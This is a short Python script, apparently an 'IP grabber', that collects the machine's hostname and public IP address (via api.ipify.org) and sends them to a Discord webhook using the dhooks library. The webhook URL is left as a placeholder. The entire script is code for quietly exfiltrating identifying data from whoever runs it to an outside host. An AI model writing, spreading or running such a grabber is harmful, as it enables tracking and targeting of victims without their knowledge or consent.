from dhooks import Webhook
import socket
from requests import get

hook = Webhook("WEBHOOK")

# py -m pip install dhooks

# name + ip
pcname = socket.gethostname()
ip = get('https://api.ipify.org'). text


hook.send(f"pc name : {pcname}\npc public ip : {ip} ")
